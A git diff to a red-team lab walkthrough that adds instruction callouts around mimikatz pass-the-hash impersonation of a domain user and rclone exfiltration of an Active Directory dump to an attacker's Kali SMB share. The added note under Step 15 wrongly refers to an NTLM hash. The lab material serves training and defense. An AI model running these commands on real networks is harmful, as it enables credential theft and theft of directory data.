@@ -131,6 +131,9 @@ You should be able to see the NTLM hash of `billh` domain user and can now use i
 While still in `mimikatz` we can use that hash of the domain user (`ATTACKRANGE\billh`) in an Pass-the-Hash attack to start a PowerShell with a Kerberos ticket belonging to that user (i.e. impersonate that user).
 
 **Step 10**
+> [!IMPORTANT]
+> Replace <NTLM-hash> with the real sting obtained from the previous step
+
 ```PowerShell
 [ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell
 ```
@@ -171,6 +174,9 @@ Let's download `rclone` executable on the system first:
 ```
 ATT&CK Techniques: `T1005`
 
+> [!IMPORTANT]
+> When saving the file in Notepad select "Save as" and "Save as type: All files" so no .txt is appended to the filename.
+
 Then we'll need to create a config file for `rclone` and put it in `C:\Temp\r.conf`:
 
 **Step 14**
@@ -193,6 +199,9 @@ In the meantime, on our Kali machine, we will create a `loot` folder and start a
 Now that SMB server is running and our `rclone` is ready, let's copy the AD dump file from Windows to Kali:
 
 **Step 15**
+> [!IMPORTANT]
+> Replace <NTLM-hash> with the real sting obtained from the previous step
+
 ```PowerShell
 [ITSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest
 ```
